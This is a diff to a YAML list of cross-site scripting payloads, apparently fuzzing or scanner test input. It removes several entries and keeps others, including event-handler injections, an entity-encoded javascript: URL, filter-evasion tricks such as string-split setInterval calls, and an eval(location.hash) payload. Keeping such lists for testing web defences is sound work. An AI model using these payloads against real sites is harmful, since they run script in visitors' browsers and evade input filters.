@@ -1,9 +1,7 @@
 ---
 payload:
-  - "<body onload=alert('test1')>"
   - "<b onmouseover=alert('Wufff!')>click me!</b>"
   - "<IMG SRC=j&#X41vascript:alert('test')>"
-  - '<script>alert("TEST");</script>'
   - '"><script>alert()</script>'
   - '<img/src=x/onerror=xxx'
   - '"onwheel=ead(111)'
@@ -18,12 +16,7 @@ payload:
   - '<ahref="javascript:top[8680439..toString(30)]()">XSS Test</a>'
   - '<ahref="javascript:window[/alert/.source]()">XSS Test</a>'
   - 'confirm.call(null,1)'
-  - "javascript:setInterval('ale'+'rt(document.domain)')"
-  - "javascript:setInterval('pri'+'nt(document.domain)')"
-  - "javascript:setInterval('fet'+'ch(document.domain)')"
-  - "javascript:setInterval('eva'+'l(document.domain)')"
   - "javascript:setInterval('con'+'firm(document.domain)')"
-  - "javascript:setInterval('prom'+'pt(document.domain)')"
   - 'alert.call(%20, "XSS");'
   - "eval(location.hash.slice(1)) #alert(1)"
   - "(alert)(1)"
